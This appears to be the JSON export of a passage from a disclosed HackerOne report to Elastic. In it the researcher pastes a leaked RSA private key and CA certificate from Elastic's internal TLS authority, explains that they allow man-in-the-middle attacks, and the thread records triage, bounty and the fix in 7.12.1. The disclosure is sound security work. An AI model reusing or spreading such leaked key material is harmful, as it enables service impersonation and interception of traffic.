KEY-----\nMIIEogIBAAKCAQEAz2b6/MOmVYlLrkiFoHW8/r9Qb+i2n/2+sU3DktQFv5t7hFTS\nj8IRTuFvfuJaEMyRrxHEMrkChKp7dv6Z6kQepSJi91b+WMsl/8kdgGK/kUUn349f\nvnoLUxuPadJQGwBGibTTMRPsNyvQGR0xjAb16F5631lMksJqclOm0VTIcOWBkfi4\nV+vej0WrwFM5YxokA2gvOMjJD7/hzjINFvqMf9+723OQWCkOcJavx2zxulXeVL/d\nvHWV62Q2DqNCI6XGnxfo76hgJbzkBphMBoV7JB9WnSGO6+YmTpq1GytnRP6YjP2M\nUfZdvE9TwNH5DbxO3mVl3M7Poke389zB5F4HWQIDAQABAoIBAD9PGwwvGMYBa+We\nY5PQfMlyUrZmXeDGjwAGUc2vBLYxWunRDpktTyU58VPU+lMobsv262HkUZ13gMqY\n+xikhIo5zeXcWzV1hXrnxCadfgZ1Cq/WTw6QqIZM4mEV/rfPRLjiRpkzkKZirFoO\nLEKnGUc+F9m3o4Uk7WNKn6BEdg7nooty1NbNiNkL84r0TNXrNqeOa2gqfRf/u7ZF\njVIIsaEeAN02cHk3oFNpvOMWc+PDQSqMMHqOhrOtv6xfblca0gqvE0/Knk0UkOQy\nQ/WBx7tsRV+jD/RVypBkr7dyErldIR7gSFdgyN2ICUpWfWcIiCl9zWktuoEcZTSp\nDRJMGYECgYEA+zadL7hQdWt2lIs5uSTFsMqspm4wjfcoXZLKayJhDqXTeOfZcv6M\nZLZR+I6WjMrTVt5FbmuCzNlshG492lJB5Z4dH1aeHxsWpU7gP0d/b5Y8UKLXDvco\nbO1r1XuXXJDSuuBVk8S0NNZWWIUSAURvA7+sJGA3laqNDCkp5aWarSkCgYEA01qp\nZgaNdDBaNb3mQKC2B/l9ZL+Dks/YIZtnLVs3iVHyIXWm6lvz1zT545P1ir9T/PPo\nb5AGFGb/HIrRwn08gFSRHI+pMGwjGo6TQcq13sADB99wEEyBPCXUDaBML4O8wgU+\nRDyFlT6rIL+zU/fBUcy1nCb6dPaHDrkgGOXFnrECgYBHn1mPanBeGeZ0EYHCnI5U\nimRRCyeCwk3a5+gYRXQAlhzF4uxnUdW7PRP/1r9rosRAhxyqj7J6Lx82Xqv52+v3\nyG2rKqnoWnPJa8SZpgvaR64om1TPan43GDXfZt5PwOaj6yPa/oEWc2mo0T/B5r30\nBqjQsjIG1Npj9jSAygdgiQKBgCa8+0eD8/FT23T2NXmq+zJC/ES3BXqnNcoTHbom\neetlZafUVJ+n8u2C/DpGKD8iClbWrcek8jhTGHc2ynOHWMt8tIwzmKMTbuuzLjJk\n4SjOsL+EqJmULCvGEzPcKZqb3sEBDQScwy8zqVH7UPcW9gv0JWVVj5pYhTChpcxq\ncOpBAoGAd5Y8Lh02C4161LTqSkuqQomaGS3Fx9rntHOMQOYVd4Mo02JDeBH8kUWZ\nWIVKr8szxnIbFJ0m9aGGkKeDXNe7U9e4ENzwdEgHyiCjo7iPBxy5+SQXP8fY1JYP\nDQUKhSsbcy/PYYK9HYDDL3SuSuaUxA5oOVzRaBDX3fDltYVcaPM=\n-----END RSA PRIVATE KEY-----\n```\n\nand certificate\n\n```\n-----BEGIN CERTIFICATE-----\nMIID/DCCAuSgAwIBAgIGAXivbrLsMA0GCSqGSIb3DQEBCwUAMCcxJTAjBgNVBAMT\nHGVsYXN0aWMgY2UgaW50ZXJuYWwgdGxzIHJvb3QwHhcNMjEwNDA4MDMwMjUwWhcN\nMjIwNTExMDMwMjUwWjBfMV0wWwYDVQQDE1RpbnN0YW5jZS0wMDAwMDAwMDAwLm5v\nZGUuNDAxMjM2NTZkNzA2NGM5ZmE3Y2JiNThmYWE1OWY2NGQuY2x1c3Rlci4yNTM0\nMzc0MDkxLmFjY291bnQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDP\nZvr8w6ZViUuuSIWgdbz+v1Bv6Laf/b6xTcOS1AW/m3uEVNKPwhFO4W9+4loQzJGv\nEcQyuQKEqnt2/pnqRB6lImL3Vv5YyyX/yR2AYr+RRSffj1++egtTG49p0lAbAEaJ\ntNMxE+w3K9AZHTGMBvXoXnrfWUySwmpyU6bRVMhw5YGR+LhX696PRavAUzljGiQD\naC84yMkPv+HOMg0W+ox/37vbc5BYKQ5wlq/HbPG6Vd5Uv928dZXrZDYOo0Ijpcaf\nF+jvqGAlvOQGmEwGhXskH1adIY7r5iZOmrUbK2dE/piM/YxR9l28T1PA0fkNvE7e\nZWXczs+iR7fz3MHkXgdZAgMBAAGjgfUwgfIwaAYDVR0RBGEwX6BdBgNVBAOgVgxU\naW5zdGFuY2UtMDAwMDAwMDAwMC5ub2RlLjQwMTIzNjU2ZDcwNjRjOWZhN2NiYjU4\nZmFhNTlmNjRkLmNsdXN0ZXIuMjUzNDM3NDA5MS5hY2NvdW50MEkGA1UdIwRCMECA\nFPwqjM/XkxWr11Z4o+e6+xsdkoA2oSCkHjAcMRowGAYDVQQDExFlbGFzdGljIGNl\nIG1hc3RlcoIGAXe5s5msMB0GA1UdDgQWBBQCvZcqZ14RE885THfQwS4XDRFBMTAM\nBgNVHRMEBTADAQH/MA4GA1UdDwEB/wQEAwIB9jANBgkqhkiG9w0BAQsFAAOCAQEA\nXX7DCQr1h8CkJp+d2BekowuzaiZZlNdZGDyNWyJDlZkWAmuTJUaT2eNboO/FsP57\nAJU7p5t0Wi6RG1f0MjmQrF5SJOPdgfg7xutapGyTU9N+pfwxMdNr97fVhvWcrXyU\nwQqY2KwJrvGeniDFXCJ9fvvK0ZCCF6HQTN1sOKrRnk/JX3COPFk21AeevkJvEgDL\ni00TTPlYFeQ+3Eq8mDTRQVV1DLkNFZMeuQ0mEaQCO4P9NnYWLNY2NCdbSoO0c/Ig\np1NvBC7Gril+1P2JSX4uhcfQW2W/LG9Fp46KBQlVwDynJhyFENg8tepAGIbo23zc\nSQDhKYIUGhFIpZhbvVPQrQ==\n-----END CERTIFICATE-----\n```\n\nwhich appears to be the SSL cert for elastic search emitted by your internal TLS certicate authority (this is the data extracted from the cert by `openssl`)\n\n```\nCertificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number: 1617850970860 (0x178af6eb2ec)\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: CN = elastic ce internal tls root\n        Validity\n            Not Before: Apr  8 03:02:50 2021 GMT\n            Not After : May 11 03:02:50 2022 GMT\n        Subject: CN = instance-0000000000.node.40123656d7064c9fa7cbb58faa59f64d.cluster.2534374091.account\n        Subject Public Key Info:\n            Public Key Algorithm: rsaEncryption\n                RSA Public-Key: (2048 bit)\n                Modulus:\n                    00:cf:66:fa:fc:c3:a6:55:89:4b:ae:48:85:a0:75:\n                    bc:fe:bf:50:6f:e8:b6:9f:fd:be:b1:4d:c3:92:d4:\n                    05:bf:9b:7b:84:54:d2:8f:c2:11:4e:e1:6f:7e:e2:\n                    5a:10:cc:91:af:11:c4:32:b9:02:84:aa:7b:76:fe:\n                    99:ea:44:1e:a5:22:62:f7:56:fe:58:cb:25:ff:c9:\n                    1d:80:62:bf:91:45:27:df:8f:5f:be:7a:0b:53:1b:\n                    8f:69:d2:50:1b:00:46:89:b4:d3:31:13:ec:37:2b:\n                    d0:19:1d:31:8c:06:f5:e8:5e:7a:df:59:4c:92:c2:\n                    6a:72:53:a6:d1:54:c8:70:e5:81:91:f8:b8:57:eb:\n                    de:8f:45:ab:c0:53:39:63:1a:24:03:68:2f:38:c8:\n                    c9:0f:bf:e1:ce:32:0d:16:fa:8c:7f:df:bb:db:73:\n                    90:58:29:0e:70:96:af:c7:6c:f1:ba:55:de:54:bf:\n                    dd:bc:75:95:eb:64:36:0e:a3:42:23:a5:c6:9f:17:\n                    e8:ef:a8:60:25:bc:e4:06:98:4c:06:85:7b:24:1f:\n                    56:9d:21:8e:eb:e6:26:4e:9a:b5:1b:2b:67:44:fe:\n                    98:8c:fd:8c:51:f6:5d:bc:4f:53:c0:d1:f9:0d:bc:\n                    4e:de:65:65:dc:ce:cf:a2:47:b7:f3:dc:c1:e4:5e:\n                    07:59\n                Exponent: 65537 (0x10001)\n        X509v3 extensions:\n            X509v3 Subject Alternative Name: \n                othername:<unsupported>\n            X509v3 Authority Key Identifier: \n                keyid:FC:2A:8C:CF:D7:93:15:AB:D7:56:78:A3:E7:BA:FB:1B:1D:92:80:36\n                DirName:/CN=elastic ce master\n                serial:01:77:B9:B3:99:AC\n\n            X509v3 Subject Key Identifier: \n                02:BD:97:2A:67:5E:11:13:CF:39:4C:77:D0:C1:2E:17:0D:11:41:31\n            X509v3 Basic Constraints: \n                CA:TRUE\n            X509v3 Key Usage: critical\n                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Certificate Sign, CRL Sign\n    Signature Algorithm: sha256WithRSAEncryption\n         5d:7e:c3:09:0a:f5:87:c0:a4:26:9f:9d:d8:17:a4:a3:0b:b3:\n         6a:26:59:94:d7:59:18:3c:8d:5b:22:43:95:99:16:02:6b:93:\n         25:46:93:d9:e3:5b:a0:ef:c5:b0:fe:7b:00:95:3b:a7:9b:74:\n         5a:2e:91:1b:57:f4:32:39:90:ac:5e:52:24:e3:dd:81:f8:3b:\n         c6:eb:5a:a4:6c:93:53:d3:7e:a5:fc:31:31:d3:6b:f7:b7:d5:\n         86:f5:9c:ad:7c:94:c1:0a:98:d8:ac:09:ae:f1:9e:9e:20:c5:\n         5c:22:7d:7e:fb:ca:d1:90:82:17:a1:d0:4c:dd:6c:38:aa:d1:\n         9e:4f:c9:5f:70:8e:3c:59:36:d4:07:9e:be:42:6f:12:00:cb:\n         8b:4d:13:4c:f9:58:15:e4:3e:dc:4a:bc:98:34:d1:41:55:75:\n         0c:b9:0d:15:93:1e:b9:0d:26:11:a4:02:3b:83:fd:36:76:16:\n         2c:d6:36:34:27:5b:4a:83:b4:73:f2:20:a7:53:6f:04:2e:c6:\n         ae:29:7e:d4:fd:89:49:7e:2e:85:c7:d0:5b:65:bf:2c:6f:45:\n         a7:8e:8a:05:09:55:c0:3c:a7:26:1c:85:10:d8:3c:b5:ea:40:\n         18:86:e8:db:7c:dc:49:00:e1:29:82:14:1a:11:48:a5:98:5b:\n         bd:53:d0:ad\n```\n\nThis means an attacker can man in the middle connections to the elastic stack without raising any certificate warnings.",
      "automated_response": false,
      "created_at": "2021-04-11T02:37:16.317Z",
      "updated_at": "2021-04-11T02:38:46.441Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11355307,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I put `A:N` in the CVSS above but as I mentioned [somewhere in this wall of text](#activity-11312476) there's an availability component to it so that bumps the score to a minimum of 9.0 according to my calcs!",
      "automated_response": false,
      "created_at": "2021-04-11T20:57:35.231Z",
      "updated_at": "2021-04-11T20:57:35.231Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11355308,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportSeverityUpdated",
      "message": null,
      "automated_response": false,
      "created_at": "2021-04-11T20:57:56.486Z",
      "updated_at": "2021-04-11T20:57:56.486Z",
      "additional_data": {
        "old_severity": null,
        "new_severity": "Critical (9.1)",
        "old_severity_id": null,
        "new_severity_id": 1046610
      },
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11366361,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugTriaged",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-12T17:30:56.445Z",
      "updated_at": "2021-04-12T17:30:56.445Z",
      "actor": {
        "username": "douglas_day",
        "cleared": false,
        "verified": false,
        "url": "/douglas_day",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11366990,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "This is a rad find @dee-see !\n\nWe're working on this now!",
      "automated_response": false,
      "created_at": "2021-04-12T18:22:08.110Z",
      "updated_at": "2021-04-12T18:22:08.110Z",
      "actor": {
        "url": "/elastic",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Elastic"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "elastic",
      "collaborator": {
        "username": "dee-see",
        "url": "/dee-see"
      }
    },
    {
      "id": 11367135,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks a lot for the bounty and bonus! :)",
      "automated_response": false,
      "created_at": "2021-04-12T18:28:17.386Z",
      "updated_at": "2021-04-12T18:28:17.386Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11566320,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "I think we can resolve this one now that [7.12.1](https://discuss.elastic.co/t/7-12-1-security-update/271433) is out!",
      "automated_response": false,
      "created_at": "2021-04-29T14:16:20.612Z",
      "updated_at": "2021-04-29T14:16:20.612Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11566764,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-29T14:56:47.038Z",
      "updated_at": "2021-04-29T14:56:47.038Z",
      "actor": {
        "username": "douglas_day",
        "cleared": false,
        "verified": false,
        "url": "/douglas_day",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "dee-see",
        "url": "/dee-see"
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11566769,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-29T14:57:13.790Z",
      "updated_at": "2021-04-29T14:57:13.790Z",
      "first_to_agree": true,
      "actor": {
        "username": "douglas_day",
        "cleared": false,
        "verified": false,
        "url": "/douglas_day",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/1ALNLRqrFXt23SDSBvAqPZAH/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11566859,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-29T15:05:10.034Z",
      "updated_at": "2021-04-29T15:05:10.034Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11566860,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2021-04-29T15:05:10.138Z",
      "updated_at": "2021-04-29T15:05:10.138Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    },
    {
      "id": 11601561,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "I noticed that I failed to award you your `Stairway to Seven` bonus for successfully filing 7 consecutively valid reports!",
      "automated_response": false,
      "created_at": "2021-05-03T17:04:58.812Z",
      "updated_at": "2021-05-03T17:04:58.812Z",
      "actor": {
        "url": "/elastic",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/607/c5cce6a2e2d95af85e014db95c2d7560e73e9bec_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "Elastic"
        }
      },
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "elastic",
      "collaborator": {
        "username": "dee-see",
        "url": "/dee-see"
      }
    },
    {
      "id": 11705158,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thanks! Happy to contribute to a bug bounty program for widely used, high impact open source software with good communication & fast payouts!",
      "automated_response": false,
      "created_at": "2021-05-11T17:59:23.744Z",
      "updated_at": "2021-05-11T17:59:23.744Z",
      "actor": {
        "username": "dee-see",
        "cleared": true,
        "verified": true,
        "url": "/dee-see",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/220/115/9a655d51cb400a5743966e9856918ed02ee8d042_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "elastic"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}